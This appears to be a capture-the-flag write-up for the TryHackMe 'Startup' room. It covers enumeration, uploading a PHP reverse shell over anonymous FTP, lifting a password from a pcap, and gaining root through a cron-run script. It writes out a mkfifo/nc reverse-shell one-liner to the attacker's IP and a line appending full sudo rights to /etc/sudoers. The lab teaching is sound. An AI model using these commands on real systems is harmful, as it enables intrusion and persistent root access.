---
title: THM{Startup}
author: Anugrah SR
date: 2020-11-11 06:50:00 +0800
categories: [Boot2root,Tryhackme]
tags: [tryhackme, ssh, nmap, sudo, gobuster, ftp, Wireshark, cron, linux]
math: true
image: "https://imgur.com/BEWeVgTl.png"
---
# Startup
## About The Room
*Abuse traditional vulnerabilities via untraditional means.*<br>
* Url:[startup](https://tryhackme.com/room/startup)
* Creator: [r1gormort1s](https://tryhackme.com/p/r1gormort1s)

## Reconnaissance
### Rustscan
```bash
rustscan -b 920 10.10.167.97
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/cyph3r/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.167.97:21
Open 10.10.167.97:22
Open 10.10.167.97:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,80 10.10.167.97

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-10 12:34 EST
Initiating Ping Scan at 12:34
Scanning 10.10.167.97 [2 ports]
Completed Ping Scan at 12:34, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:34
Completed Parallel DNS resolution of 1 host. at 12:34, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:34
Scanning 10.10.167.97 [3 ports]
Discovered open port 21/tcp on 10.10.167.97
Discovered open port 22/tcp on 10.10.167.97
Discovered open port 80/tcp on 10.10.167.97
Completed Connect Scan at 12:34, 0.14s elapsed (3 total ports)
Nmap scan report for 10.10.167.97
Host is up, received conn-refused (0.14s latency).
Scanned at 2020-11-10 12:34:53 EST for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```
We have 3 ports Open
* 21/tcp open  ftp
* 22/tcp open  ssh
* 80/tcp open  http

### FTP
#### Check for anonymous login

```bash
ftp 10.10.167.97
Connected to 10.10.167.97.
220 (vsFTPd 3.0.3)
Name (10.10.167.97:cyph3r): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 09 02:12 .
drwxr-xr-x    3 65534    65534        4096 Nov 09 02:12 ..
-rw-r--r--    1 0        0               5 Nov 09 02:12 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp
-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
```
Get the file `notice.txt` and `.test.log`

```bash
ftp> get .test.log
ftp> get notice.txt
```
`ftp` folder was empty

## HTTP
when we visit the website, we can see
![](https://imgur.com/884di7rl.png)

### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.167.97/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.97/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/10 12:44:18 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 312] [--> http://10.10.167.97/files/]
```
When we go to files [http://10.10.167.97/files]
We can see directory listing is enabled with files we saw in `ftp`
![](https://imgur.com/eZLGGtgl.png)

## Gaining Shell
ftp file is empty as we saw earlier
using ftp `put` command, i was able to upload my reverse-php shell.
but only the shell in ftp folder.
### FTP to Upload Shell
```bash
ftp> put rshell.php
local: rshell.php remote: rshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5490 bytes sent in 0.00 secs (56.2975 MB/s)
```
![](https://imgur.com/rhpnJw6l.png)

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.82.80] from (UNKNOWN) [10.10.167.97] 45064
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:49:10 up 17 min,  0 users,  load average: 0.00, 0.05, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
I found our first recipe in recipe.txt!
Let's get the user flag.
## Local privilege escalation
I tried `sudo -l`, `crontab`, ssh bruteforce for user `lennie` which i identified in home. No luck with that!

After running to find that next step, i run `linpeas.sh` and noticed these folders
```bash
/vagrant
/incidents
/lost+found
/data
```
I checked the `incidents` directory, found
`suspicious.pcapng`. Downladed the file using wget and python simple server.
The file extension reminded me of pentesterlab pcap badge!
so it was time to open `Wireshark`!

### Wireshark
After going through the logs in Wireshark, after a lot of trial and errors in `tcp.stream eq 7` following tcp found that valuable information.
![](https://imgur.com/xPzy0H3l.png)

`c4ntg3t3n0ughsp1c3` looks like the password for user `lennie`
login to lennie using `su lennie`

![](https://imgur.com/eiNZnJhl.png)

User flag was found
```bash
cat user.txt
THM{xxxxxxxxxxxxxxxxxxx}
```
## Privilege escalation
Looking into `/scripts` directory
```bash
lennie@startup:~/scripts$ ls -la  
ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov  9 02:13 .
drwx------ 4 lennie lennie 4096 Nov  9 02:12 ..
-rwxr-xr-x 1 root   root     77 Nov  9 02:12 planner.sh
-rw-r--r-- 1 root   root      1 Nov 11 12:42 startup_list.txt

lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

lennie@startup:~/scripts$ ls -la /etc/print.sh
ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov  9 02:12 /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$

```                                
`planner.sh` can be runned by us but we can not remove or modify the files in the scripts directory.
But we can edit the file `print.sh` file which is being called in `planner.sh`.
### Full TTYs
Before editing the file in vim we need to set oru TTY
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
Inside the nc session
 Press `CTRL+Z` and add the following lines.
```bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
using `vim` edit `/etc/print.sh` to add our bash reverse shell
```bash
lennie@startup:~$ cat /etc/print.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.82.80 1235 >/tmp/f
```
Now we wait with our netcat to get a connection through our bash reverse shell

Bingo!
![](https://imgur.com/EM7BaRNl.png)
### Alternative way: Sudoers file
We can add `lennie` to sudoers files with full root access
```bash
lennie@startup:~$ cat /etc/print.sh
#!/bin/bash
echo "lennie ALL=(ALL) ALL" >> /etc/sudoers
```
After sometimes, run `sudo bash`. You will be root!

### Root flag
```bash
# cat /root/root.txt
THM{xxxxxxxxxxxxxxxxxx}
```
Congratulations and thank you for reading!
